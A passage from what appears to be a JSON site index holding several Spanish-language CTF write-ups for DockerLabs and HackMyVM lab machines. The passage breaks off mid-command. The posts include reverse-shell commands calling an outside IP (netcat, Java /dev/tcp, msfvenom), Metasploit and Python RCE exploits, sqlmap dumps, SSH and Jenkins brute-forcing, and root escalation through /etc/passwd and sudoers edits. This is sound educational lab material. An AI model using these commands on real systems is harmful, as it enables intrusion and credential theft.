    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Uso de metasploit RCEHerramientas y recursos  nmap  metasploitReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con lo...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Uso de metasploit RCEHerramientas y recursos  nmap  metasploitReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX chocolatefire 172.18.0.2reporteComo vemos en el reporte en esta ocasión nos han dejado un montón de puertos para investigar yo a por el primero que he ido ha sido el 9090 que es el que devolvía claramente un 200 ok.Nos devuelve un login en el cual tenemos acceso con pass y user adminRevisando por internet vemos que hay varias formas de explotación y de versiones explotables en este caso estamos frete a una 4.7.4.No me caliento mucho y voy directo a usar msfconsole.InfiltraciónNos aporta dos posibilidades , elijan el RCE.Vemos que opciones hay que configurar y procedemos.Una vez todo listo solo que correr el exploit con RUN o EXPLOIT.Gracias por leer"
  },
  
  {
    "title": "HereBash , DockerLabs",
    "url": "/posts/herebash/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, bash basico, stego, John",
    "date": "2024-06-17 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Un poco de nmap  Bash  EsteganografiaHerramientas y recursos  nmap  steghide  John th ripperReconocimiento y enumeracionLo primero como siempre le tiramos u...",
    "content": "En este reto de DockerLabs practicamos.  Un poco de nmap  Bash  EsteganografiaHerramientas y recursos  nmap  steghide  John th ripperReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX nuevo 172.17.0.2reporteComo vemos en el reporte disponemos de dos puertos abiertos uno el 22 servicio ssh y el 80 http con apache.La version que nos indica nmap de ssh parece ser buena para enumeracion de usuarios.No obsatante y por si trabajamos o pensamos trabajar realizando pentest es importante ser sigilisos  y recabar toda la informacion posible antes de empezar a hacer ruido de verdad.Dicho eso hay comandos de nmap mejores no como el de arriba.Primero reviso la WEBLa web parace que es la default de apache pero hay varias cosas cambiadas sutilmente.Si leemos bien veremos que nos da info y rutas interesantes y que no debia estar en esa pagina.Sigiendo uno de los enlaces me lleva a otra pagina con con mas info.Aqui nos habla de la importancia de los metodos como haciendo referecnia al tipo de solicitud.En una de las rutas encuentraremos un directorio upload que contiene una imagen la descargo.Lo primero que pruebo es por si la imagen esconde algo , hago uso de steghide.steghide info ohrecallwin.jpgComo vemos nos indica que necesitamos un salvoconducto para ver como se cifro y que contiene.Si regresamos a la web de bob nos habla de los metodos  y la de default nos da un ruta , hay que fijarse.Si lanzamos una peticion GET nos da esa respuesta.Ahora desde la terminal lanzo la correcta.Me devuelve lo que debe ser el salvoconducto.steghide extract -sf ohnorecallwin.jpgNos devuelve un archivo zip que esta tambien protegido , hacemos uso de john, primero hasheamos y a posterior crak.zip2jonh seguro.zip &gt; hashjohn hash --showAbrimos el zip con el pass que nos entrega john y leemos el contenido del txt.Ahora tenemos un pass es momento de entrar al sistema.InfiltracionHacemos login con rosa y despues de un ls -la vemos un directorio guion entramos y esta claro que ahi se escondio la pass del siguiente usuario es hora de hacer uso de unos comandos de bash.Aqui podemos tener varias situaciones que todos los archivos pesen lo mismo y tengamos que buscar leyendo el contenido de cada uno o que el que contenga la pass sea distinto.ls -laR | awk '{print $1, $5, $9}' | sed '/14/d'Una vez obtenido solo leemos el fichero y obtenemos el pass del otro usuario.Movimiento lateralUna vez dentro como pedro tenemos un directorio nombrado “…” acedemos y leemos la nota , en esta ocoasion con un simple comando podemos encontrar la siguiente pass.find / -type -f -user pedro 2&gt;/dev/nullEncontamos el archivo y la pass esta codificada en base64 la decodeamos y hacermos login con juan.echo 'cadena a decodear' | base64 -dPor fin somos juan veamos que tenemos.Despues de revisar todo encontramos el pass de root en un alias.Gracias por leer"
  },
  
  {
    "title": "Whoiam, DockerLabs",
    "url": "/posts/whoiam/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, wordpress, bash command inyection",
    "date": "2024-06-13 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Reconocimiento  Explotacion de wordpress  Movimiento lateral de ususarios con sudo  Inyeccion bash scriptingHerramientas y recursos  nmap  wpscan  feroxbust...",
    "content": "En este reto de DockerLabs practicamos.  Reconocimiento  Explotacion de wordpress  Movimiento lateral de ususarios con sudo  Inyeccion bash scriptingHerramientas y recursos  nmap  wpscan  feroxbusterReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX whoiam 172.18.0.2reporteComo vemos en el reporte solo en esta ocasión solo tenemos el puerto 80 abierto abierto por tanto la intrusión y el error si o si están el web.Con la extensión wappalizer ya sabemos que hay presumiblemente un wordpres así que primero buscamos vulns con wpscan.Con fuerza bruta no conseguimos nada con ninguno de esos usuarios.Parece que quien desarrollo el plugin trabajaba de espía para la competencia.Justo es lo que yo buscaba para practicar xss hay de todos los colores , pero en este caso vamos a probar para empezar el Authenticated Arbitrary File Upload leading to RCE.En casi todas las vías de explotación necesitamos estar autenticados excepto en CVE-2021-24146 pero solo nos devuelve info con las publicaciones realizadas , tampoco tuve suerte con el blindsql.En definitiva como si o si hay que estar autenticado en la web lanzamos feroxbuster buscando mas directorios por si se escondió alguna pista.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.18.0.2Con feroxbuster encontramos un directorio llamado backups y un archivo prometedor dentro lo descargamos.Resulto un zip con un asci en su interior que contenía el pass de developer.Procedemos a logearnos.IntrusionEntramos sin problemas ahora busco un poco de info para saber como es la explotación con dicho plugin.  Se me olvido la versión del plugin y lanze de wpscan pero sin token, no fue capaz de encontrar las vulns.Realizamos una búsqueda en searchploitEl que nos interesa es el 50082.py , lo lanzamos.python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^Obteniendo una webshell para ejecutar comandos.Ahora es momento de mandarnos una revshell para trabajar mas gusto y sin limitaciones.Nos ponemos a la escuche , la mandamos y realizamos el tratamiento a la tty.Movimiento lateral usuariosNos encontramos con que somos www-data y disponemos de permisos para ejecutar find con sudo como el usuario rafa.sudo -u rafa find . -exec /bin/sh \\; -quitAhora a ver que nos han dejado siendo rafa.Encuentra debugfs buscamos como se hace.sudo debugfs!/bin/shSomos ruben ,seguimos para convertimos en root pues solo habían dos usuarios.Escalada finalEsta ultima parte es mas interesante pues nos han dejado un script veamos que contiene , los permisos y si nos deja modificarlo o deberemos abusar del path.&lt;Right&gt;#!/bin/bashread -rp \"Enter guess: \" numif [[ $num -eq 42 ]]then  echo \"Correct\"else  echo \"Wrong\"fiComo vemos el script es muy sencillo lo unico que hace es comprobar el numero ingresado y dependiendo de si aciertas te dice si es correcto o no.Hasta aquí fui bien pero no conseguí no hallar la manera de meter un comando que me permita ser root , puede copiar bash con permisos de suid pero después fue imposible ejecutar esa bash manteniendo los permisos elevados.Sin mas acudí a un writeup  para poder ver como inyectaban el comando en el script de bash.La carga útil por así llamarla esa[$(/bin/bash&gt;&amp;2)]Para mi por esta ultima parte la hubiese metido en dificiltad media.Como me gusta romperme los cuernos buena maquina.Enlace al blog de pylon creador de la maquina.Gracias por leer"
  },
  
  {
    "title": "Bashpariencias , DockerLabs",
    "url": "/posts/bashparencias/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-06-09 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  Bash scripting basico  Abuso de sudoHerramientas y recursos  nmap  Bucles for  Mario  Password cracking john zip2johnReconocimiento y enumer...",
    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  Bash scripting basico  Abuso de sudoHerramientas y recursos  nmap  Bucles for  Mario  Password cracking john zip2johnReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX bashpariencias 172.18.0.2reporteComo observamos en el reporte no encontramos con el puerto 80 y un servidor ssh  corriendo en el 8899 con una versión la cual podríamos explotar.Empiezo por lo mas fácil que es revisar la web del tirón ya me indica algo prometedor pues habla una usuaria con poca experiencia.Revisando bien toda la web puedo ver que existe una pequeña fuga del nombre de dicha usuaria.Ahora me fijo directo a ese código.Tenemos la password de rosa.Hacemos login por sshIntrusionUna vez logueados con rosa vemos una carpeta en su directorio personal.Si nos fijamos es un directorio con un guion por nombre.En el mensaje queda claro como seguir, debemos cracker el archivo zip para obtener la contraseña.Primero nos lo transferimos a nuestra maquina.python3 -m http.server 9000zip2john ../../../backup_rosa.zip &gt; zip.hashjohn zip.hashPor otro lado el mensaje queda algo confuso porque nos dice que lo capturemos cuando en realidad lo que vemos es un archivo .zip y debemos crackearlo con john.Tratemos de ver los procesos que corren……ps -auxfVemos que hay un proceso con nombre pass_juan.sh , nos lleva a pensar que esta guardando la contraseña en algún lugar y solo puede ser donde tengamos permisos de escritura en home de rosa que no hay nada , en /tmp o /opt , eso serian los directorios comunes.Lanzamos y probamos un bucle por si hay suerte.for (( ; ; )) ; do cp /tmp/*.txt /home/rosa ; doneTenemos suerte en tmp y nos copia un archivo con el mismo pass que obtuvimos del zip.Movimiento lateralAhora nos convertimos en juan.Como juan vemos que tenemos permisos de sudo en dos binarios tree y cat por tanto ya sabemos que lo que hemos de buscar esta bajo algún directorio de Carlos.Como vemos nos ocurre lo mismo de antes tenemos dos opciones una mas fácil y otra con la que hemos de hacer uso de un poco de bash scripting.Visto que tenemos la pass a la vista practiquemos con bash no seamos de los que acudían al rincón del vago en tiempos antiguos.El mensaje nos dice que olvido lo tres últimos caracteres de su pass , entonces podemos crear otro pequeño bucle de for concatenando letras del abecedario y posteriormente hacer una de dos u otro bucle con while o for probando contra carlos o hacer uso del script que hizo Mario que viene genial para fuerza bruta local en linux.#!/bin/bashpalabra=chocolatefor c1 in {a..z}; do\tfor c2 in {a..z}; do\t\tfor c3 in {a..z}; do\t\t\techo \"$palabra${c1}${c2}${c3}\" &gt;&gt;dict2.txt\t\tdone\tdonedone Ahí creamos el diccionario personalizado para la ocasión.Ahora nos faltaría el script para ello lo mas sencillo ir a su github copiarlo y aprovechar  que tenemos nano y pegarlo ahí mismo.Entre el dic creado y el script de Mario resolvemos el problema.Podemos convertirnos en carlos y vemos que tiene permisos de root con el binario tee.Escalada finalAsí que tratamos de crear una nueva entrada para el fichero etc/passwd1ªCreamosa la pass para el usuarioopenssl passwd -1 -salt \"firstatack\" \"pass\"2ª La pegamos al ficheroprintf 'firstatack:$1$firstata$KaJwXv0namG9OzwTOxpN61:0:0:root:/root:/bin/bash\\n' | sudo tee -a /etc/passwd3ª- Hacemos login con el usuario creado.Gracias por leer"
  },
  
  {
    "title": "Eclipse , DockerLabs",
    "url": "/posts/eclipse/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, rce",
    "date": "2024-06-08 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  Explotacion Slor 8.3.0Herramientas y recursos  nmap  msfconsole  scriptReconocimiento y enumeracionLanzamos nmap con los parámetros de costu...",
    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  Explotacion Slor 8.3.0Herramientas y recursos  nmap  msfconsole  scriptReconocimiento y enumeracionLanzamos nmap con los parámetros de costumbre en un ctf.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX eclipse 172.17.0.2reporteDespués de revisar el reporte de nmap nos encontramos con el puerto 80 el cual corre un servicio apache , también observamos que corre otro servicio en el puerto 8983 que resulta ser un servidor web escrito en java usado para realizar búsquedas verticales (es decir dentro un blog por ejemplo).En el 80 solo disponemos de una imagen la cual no nos proporciona nada así que investigamos bien a solr.Como vemos en la parte del dashboard ya nos dice la versión , con ese dato paso a buscar si es explotable.Estamos de suerte y encontramos varios métodos realmente es el mismo pero con distintas formas uno con metasploit y otro con un script de python.Intrusion  Realizo tanto método con msfconsole como con script  Ojo los que no acostumbramos a usar msf pues se me pasaba por alto el parámetro set target y no me funcionabaCon metasploit sigo los pasos después de leerlo bien y nos adaptamos a nuestro entorno.metasploituse exploit/multi/http/solr_velocity_rceset RHOST 172.17.0.2checkset TARGET 1set LHOST 192.168.0.112Si nos fijamos en la imagen de abajo y dependiendo del softaware a explotar también disponemos de opciones dependiendo de donde este instalado dicho software,  show options  y show targets hay que acostumbrase a invocarlos.Hasta que me di cuenta del target paso un buen rato :-)…….Hasta aquí con metasploit.Metodo scriptCon este método es incluso mas sencillo solo debemos indicar la ip de la victima , el puerto y el comando a ejecutar por defecto tira un whoamiVamos a través del script a mandarnos una shell con netcat.Para ello en la victima ejecutamos.python3 exploit_solr_8.3.0_velocity.py 172.17.0.2 8983 \"nc 192.168.0.112 9999 -c /bin/bash\"y nos ponemos a la escucha.nc -lnvp 9999Realizamos tratamiento de la ttyscript /dev/null -c bashcontrol \u001astty raw -echo; fgEscaladaLo primero pruebo con sudo y nos pide pass, después tiro de find , con find obtenemos dosbox.Leyendo un poco entiendo que el binario nos permite escribir si no me equivoco aquí tendríamos varios archivos en los que poder escribir para hacernos root.Trate de escribir el fichero /etc/passwd el cual conseguía escribirlo pero al realizar su con el nuevo usuario que le ponía no me permitía el login error authentication failureCon mi método hacia lo siguiente pero no conseguí que funcionara.LFILE=/etc/passwdopenssl passwd -1 -salt \"loco\" \"qwerty\"/usr/bin/dosbox -c 'mount c /' -c \"echo loco:$1$lvWjKN2kvSJaYzi69Mk/:0:0:root:/root:/bin/bash &gt;&gt;c:$LFILE\" -c exitComo veis intentaba crear un usuario con privilegios de root y lo añadía al /etc/passwd.Aparentemente se añadía pero no permitía el login.Así que para terminar la maquina realice lo siguiente con sudoers.LFILE=/etc/sudoers.d/ninhackdosbox -c 'mount c /' -c \"echo ninhack ALL=(ALL) D: ALL &gt;c:$LFILE\" -c exitMuchas gracias por leer compartan y si averiguan como conseguirlo a través del passwd comenten ….un saludo."
  },
  
  {
    "title": "UserSearch , DockerLabs",
    "url": "/posts/usersearch/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, sqli",
    "date": "2024-06-02 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  sqliHerramientas y recursos  nmap  feroxbuster  sqlmapEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo nmap -p- -sS -...",
    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  sqliHerramientas y recursos  nmap  feroxbuster  sqlmapEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX usersearch 172.18.0.2reporteComo vemos en el reporte nos encontramos con ssh y el apache accesible.Mientras reviso la web nos lanzamos feroxbuster en busca de mas pistas.Despues de estar pronbando manualmente distintos tipos de inyeccion xss, ssti, sql, no consiguo nada hasta que me da por poner admin.Como vemos en la imagem nos devuelve un password el cual pruebo con ssh sin exito.Me lleva a pensar que hay una bbdd y que solo devuelve el contenido cuando acertamos con el usuario.La respuesta de ferox nos encuentra un directorio javascript y un fichero db.php el cual debe de ser el encargado de realizar las peticione , como manualmente no puede me lanzo sqlmap.SQLIEste primer comando nos va a buscar todas la bbdd que encuentre.sqlmap -u http://172.18.0.2 --forms --dbs --batchRevisando la salida del sqlmap leo que la inyeccion se provoca a traves del parametro user.Una vez sabemos los nombres de las bbdd nos seguimos metiendo mas a fondo en esta ocasion debemos indicar que queremos ver las tablas de la base de datos que nosotros queramos.sqlmap -u http://172.18.0.2 --forms -D testdb --tables --batchComo vemos nos encuentra la tabla de users , ahora le hemos de indicar que nos muestre el contenido de dicha tabla que ya esta en columnas.sqlmap -u http://172.18.0.2 --forms -D testdb -T users --columns --batch Y por ultimo nos a de mostrar el contenido de las columnas.sqlmap -u http://172.18.0.2 --forms -D testdb -T users -C password,username --dump --batchYa conseguimos leer leer los posibles usuarios y contraseñas.InfiltracionYA habiamos probrado el user admin y no era asi que vamos a probar otro.Entro con el user kvzlxComo vemos nos deja realizar la escalada con python3.Escalada finalPara convertirnos en root realizo los siguientes pasos.  Elimino el script que indica sudo  Creo uno nuevo con el siguiente contenido.       import os;os.system('/bin/bash')    Por ultimo ejecutosudo /usr/bin/python3 /home/kvzlx/system_info.py Muchas gracia por leer e interesarte en esto temas.Comparte conocimiento."
  },
  
  {
    "title": "StrongJenkins , DockerLabs",
    "url": "/posts/strongjenkins/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-06-01 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  Fuerza bruta  Scripting con Groovy  Tratamiento de terminalHerramientas y recursos  nmap  whatweb  feroxbuster  ffufEnumeracionLanzamos nmap...",
    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  Fuerza bruta  Scripting con Groovy  Tratamiento de terminalHerramientas y recursos  nmap  whatweb  feroxbuster  ffufEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX StrongJenkins 172.17.0.2reporteComo nos indica nmap en este caso solo encontramos el puerto 8080 abierto y por el nombre de la maquina hay un jenkins corriendo , tambien vemos que encontro un archivo robots.txt.Veamos el robots.No aporta mucho de momento pues lo iunico que dice es que no quiere que los robots sigan los enlaces de contruccion pero es un comentario no una directiva.Ahora pasemos a observar el jenkins. Fuzzeamos por si hubiese algo mas.He tirado de feroxbuster pero no encuentra nada excepto el jenkins y nada a lo que podamos tener acceso excepto las propias imagenes de la pagina de login , no queda otra que hacer fuerza bruta.Primero me lanzo whatweb para saber que version es e intentar con las credenciales por defecto.Buscamos en internet cuales son las credenciales por defecto, averiguamos que a partir de la v2.93 se dejan de usar las credenciales por defecto que eran admin/Jenkins y tambien que el password se guarda en .jenkins/secrets/initialAdminPassword.Por lo tanto si estamos en la version 2.440.2 ya sabemos que el user es admin , asi que con unos pocos datos mas podremos lanzar el ataque.Para poder realizar el ataque como pretendo necesito saber varios parametros.  Nombre del fichero contra el que autentifica  A donde nos redireciona cuando hay error  Nombre de los valores donde introducimos user y pass  El metodo que esta claro es post.Yo lo hago desde las herramientas de desarollador.Fuerza brutaVoy a usar ffuf pues no conocia el poder que puede llegar a tener esta herramienta , probe hydra y no puede dar con el parametro que me mostrase cual el payload correto peso a que lo encontraba porque se veia claramente que la redireccion no era hacia loginErrorComandos de hydra sin exitohydra -l admin -P /home/quino/Maquinas_hack/Dockerlabs.es/Strongjenkins/dict.txt 172.17.0.2 -s 8080 http-post-form \"/j_spring_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Login:Invalid username or password\" -v Paso para ffufffuf -u http://172.17.0.2:8080/j_spring_security_check -r -c -w /home/quino/rockyou.txt -X POST -d 'j_username=admin&amp;j_password=FUZZ&amp;from=%2F&amp;Submit=LoginError' -H 'Content-Type: application/x-www-form-urlencoded' -fl 9   La perseverancia nos ayuda a lograr nuestros objetivos.InfiltracionAhora ya podemos logearnos y ver como nos mandamos un shell reversa.Una vez logueado nos trasladamos a administrar jenkins y abajo del todo tenemos la consala de scripts.Si leemos nos dice que son groovy script , debe ser algo de java y como no tengo idea me voy a revshells en busca de ayuda.Primero nc a la escucha como de costumbre.Pasteamos el codigo que nos dio revshellsNi idea pq lo metio en one-liner , pero me conecto sin problemas.Tratamiento ttyscript /dev/null -c bashcrtl \u001astty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=bashDependiendo de como siga la escalada nos convendria setear tambien nuestros rows y columns.Como podemos ver en la imagen de abajo realizo varias comprobaciones y tengo exito con el comando findNos han dejado de regalo python3.10 con privilegios suid.Recomiendo instalar searchbins es increible mas rapido que navegar hasta gtofbins.Escalada finalEjecutamos como nos indica y nos convertimos en root.En la siguiente imagen podeis ver lo que sucede cuando no se ajustan la rows y la columms en nuestra terminal.No obstante nos convertimos en root.Gracias por llegar hasta aqui.  Si saben como hacer brute force contra jenkins con hydra comenten."
  },
  
  {
    "title": "Vivifytech , HackMyVm",
    "url": "/posts/vivfytech/",
    "categories": "HackMyVm",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-30 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursos usados  Nmap  feroxbuster  wpscanEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX vivfytech 192.168.0.104Reporte nma...",
    "content": "Herramientas y recursos usados  Nmap  feroxbuster  wpscanEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX vivfytech 192.168.0.104Reporte nmapComo nos indica el reporte de nmap disponemos de varios puntos que revisar 22 ssh , 80 http y 3306 , 33060 que paracen ambos mysqlEn el 80 lo unico que encontramos es la plantilla por defecto de apache pero como tambien parece estar mysql deberia de haber algo mas.Fuzzeamos un poco tanto con gobuster como con feroxbuster.Con cada uno encuentro cosas interesantes.Feroxbuster me indica que tenemos uploads , wp-includes listable desde la web.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://192.168.0.104Gobuster me dice que dentro de wp-includes hay un fichero llamado secrets.txt , lo descargamos y revisamos su contenido , no se si son usuarios o posibles passwords.RARO ES QUE SE PUEDA LISTAR INCLUDESRevisando la web vemos que hay un editor que se llama sancelisso lo cual podria ser un posible usuario revisamos tambien sus posts por si hay alguna pista extra si no tiraremos de hydra con sancelisso y la lista secrets.txt.Asi que me abro un txt en la maquina atacante y anoto sancelisso.Uno de los posts de este usuario nos cuenta que hay detras de la empresa vivfytech y lo que cuenta promete pues hay un ,ogollon de nombres de usuario lo cual me indica que secrets.txt son passwords.Anotamos todos los nombres sin dejarnos ningunoEn este punto podemos lanzar hydra contra ssh o probar a explotar wordpress.Yo pruebo primero con wpscan dado que es mas rapido que un ataque al protocolo ssh.wpscan --url http://192.168.0.104/wordpress/ -U users.txt -P secrets.txt  No hubo suerte asi que no queda otra que tratar con hydra.Debe ser una madriguera de conejo.hydra -L /home/quino/Maquinas_hack/hackmyvm/vivifytech/skills/user.txt -P /home/quino/Maquinas_hack/hackmyvm/vivifytech/skills/secrets.txt ssh://192.168.0.104 -t 4Tenemos suerte y nos encuentra un pass rapidisimo asi que hacemos login con las credenciales proporcionadas por hydra.InfiltracionNos conectamos via ssh y listamos para obtener la primera flag si os interesa.Vemos que existe un directorio llamado private con un fichero el cual contiene las tareas que debe realizar en la empresa y tambien un usario y passProbamos el login con esos credenciales.Conseguimos entrar , ahora debemos buscar como escalar privilegios quien me sigue sabe que siempre ejecuto primero sudo -l y en esta ocasion estamos de suerte nos han proporcionado el binario git con permisos de superusuario.Escalada finalMaquina lista.Muy divertida y jodida porque en varias ocasiones te hace pensar que la resolucion va por otro lugar….Gracias por leerGracias por leer."
  },
  
  {
    "title": "Database , DockerLabs",
    "url": "/posts/database/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, sqli, xss",
    "date": "2024-05-30 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs nos encontramos con el tipico escaneo de puertos , enumeracion de samba , sql injection , movimiento lateral entre usuarios y escalada final.Herramientas y recursos  nmap...",
    "content": "En este reto de DockerLabs nos encontramos con el tipico escaneo de puertos , enumeracion de samba , sql injection , movimiento lateral entre usuarios y escalada final.Herramientas y recursos  nmap  enum4linux  Exploit notesEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo _nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX database 172.17.0.2reporteObservamos que tenemos el 22 el 80 y tanto el 139 como el 445 que coresponden al protocolo samba.Mientras continumamos con la enumeracion haciendo uso de enum4linux para ver que podriamos tener en samba reviasamos la web.Nos muestra un panel de login aqui podriamos probar varias cosas desde xss , sqlinjection , csp ,…. ,  si nos fijamos en el codigo no hay nada que de seguridad ni sanitizacion en la web.  Yo en este punto perdi mucho tiempò tratando de abusar del csp intentando leer el /etc/passwd , sin exito obvio .En la siguente imagen podemos ver que es susceptible a la inyeccion.Ejecuto:\"/&gt;'&gt;&lt;script src=data:text/javascript,alert(1234)&gt;&lt;/script&gt;Da errorPero lo traga  Ahora deberíamos probar a hacer login .'or 1=1-- -Conseguimos loguearnos pero a simple vista y en mi opinion esto es un agujero para perder tiempo “imagino deben haber payloads de sql inyection que nos muestren los usuarios y las passwords lo ignoro por ahora”Veamos ahora que hemos conseguido con enum4linux.enum4linux -a 172.17.0.2Esta vez tenemos mas suerte y encontramos usuarios con lo cual ya podriamos probrar con hydra hacia ssh.Para ello me creo un fichero con los nombres de los usuarios para pasarselo a hydra .hydra -L usuarios -P /home/quino/Descargas/rockyou/rockyou.txt ssh://172.17.0.2 -t 4InfiltracionHydra nos a conseguido la pass del usuario augustus , como  le pasamos la lista con los nombres de usuarios yo lo dejo trabajando por si me saca la de dylan o la de bob , mas que nada por si augusto es otra madriguera de conejo como e  login web.Vamos a logearnos y salimos de dudas.Yo siempre busco con sudo -l .Tenemos java para poder realizar movimiento lateral hacia dylan , ahora si que detengo el hydra que estaba corriendo.Intento con una revshell crada a traves de revshells.com y en este caso el codigo no funciono.Codigo que no funciono en esta , pero si andubo en la pinguinazo.public class shell {\tpublic static void main(String[] args) {\t         Process p;         \t         try {             \t\tp = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1\");  p.waitFor();             p.destroy();                } catch (Exception e) {}     \t} }Buscando en internet encuentro el suguiente enlace java exploitmsfvenom -p java/shell_reverse_tcp LHOST=&lt;local-ip&gt; LPORT=4444 -f jar -o shell.jarAhora reviso el fichero creado y me queda claro que la diferencia salta a la vista , no me andaba porque le pasaba un script y estaba esperando un binario.Nos lo transferimos con python creando un server http y una vez lo tenemos ejecutamos para convertirnos en dylan.Nos ponemos en escuha como siempre antes de ejecutar la revshell.Una vez recibida la conexion realizamos tratamiento de la tty.Empezamos con sudo para ver si pasamos a bob o a root directos.En esta ocasion sudo no nos aporta nada pero con find tenemos suerte y encontranos el binario env con suid y podemos realizar la escalada final.Escalada finalfind / -perm -4000 2&gt;/dev/nullEjecutamos como nos indica y somos root.Hasta aqui la maquina.Muchas gracias por leer .."
  },
  
  {
    "title": "BorazuwarahCTF , DockerLabs",
    "url": "/posts/borazu/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-29 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  nos encontramos una maquina sencilla ideal para los primeros pasos de quien este aprendiendo.Herramientas y recursos usados  Nmap  feroxbuster  exiftool  hydraEnumeracio...",
    "content": "En este reto de DockerLabs  nos encontramos una maquina sencilla ideal para los primeros pasos de quien este aprendiendo.Herramientas y recursos usados  Nmap  feroxbuster  exiftool  hydraEnumeracionComo siempre lanzamos nmap.reporteNos muestra que solo tenemos el 22 de ssh y el 80 con apache.Primero revisamos la web.Vemos que solo hay una imagen y no hay comentarios ni nada asi que descargamos la imagen por si esconde algo.exiftool imagen.jpegexifGenial escondia un nombre de usuario , ahora con ese nombre de usuario podemos lanzar hydra , recondemos que esta el 22 abierto.hydra -l borazuwarah -P /home/quino/Descargas/rockyou/rockyou.txt ssh://172.17.0.2 -t 4 No tarda nada en devolvernos un password , pasamos a conectar por ssh.Una vez conectados buscamos como escalar yo siempre ejecutao sudo -l primero.Como vemos podemos ejecutar bash con permisos elevados.sudo bashLlegamos al final somos root , maquina ideal para dar los primeros pasos.Gracias por leer."
  },
  
  {
    "title": "Verdejo , DockerLabs",
    "url": "/posts/verdejo/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-24 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs tenemos un escaneo de puertos , un server side template injectiony escalada de privilegios.Herramientas y recursos usados  NMAP  SSTIMAP  hacktricksEnumeracionComo siempr...",
    "content": "En este reto de DockerLabs tenemos un escaneo de puertos , un server side template injectiony escalada de privilegios.Herramientas y recursos usados  NMAP  SSTIMAP  hacktricksEnumeracionComo siempre primero lanzamos nmap.reporteEn el reporte observamos 3 puertos abiertos, el 22 por la version tan nueva y dado que no tenemos ni pass ni user lo descartamos , en el 80 vemos la plantilla de apache y en el 8089 tenemos un Werkzeug/2.2.2 Python/3.11.2 asi que vamos a mirar bien ese puerto.Hacemos una comprobacion por si traga un ssti .Como vemos,  ejecuta la operacion que le indicamos por tanto tenemos un ssti.  Llegados a este punto he de aclarar que no es nada facil saber distinguir entre estas vulnerabilidades, es casi un prueba y error.Fase de identificaciónIdentificar el motor de la plantilla implica analizar mensajes de error o probar manualmente varias cargas útiles específicas del idioma. Las cargas útiles comunes que causan errores incluyen ${7/0}, {{7/0}} , y &lt;%= 7/0 %&gt;. Observar la respuesta del servidor a las operaciones matemáticas ayuda a identificar el motor de plantilla específico.Ahora que tenemos claro que tenemos un ssti procedemos a explotarlo , se podria hacer manualmente , con scripts incluso con burpsuit.Yo en este caso opto por probar con un script SSTIMAP.ExplotacionCuando hacemos uso de script debemos aportar la ruta completa es decir , no podemos darle solo la ip y el puerto , le debemos indicar cual es el archivo contra el que trabaja.Como explican en el enlace que comparti dependiendo de la respuesta de la carga util nos indica frete a que estamos.Me lanzo un tinja y observo los resultados.Ahora que mas o menos tenemos claro que es me lanzo sstimap para realizar la explotacion , repito podeis hacerlo manualmente desde la misma web leyendo algun fichero que os proporcione nombre de usuario para atacar por ssh con hydra , yo opto por este metodo.Como gracias a tinja ya sabemos que hay lanzo este comando directo.python3 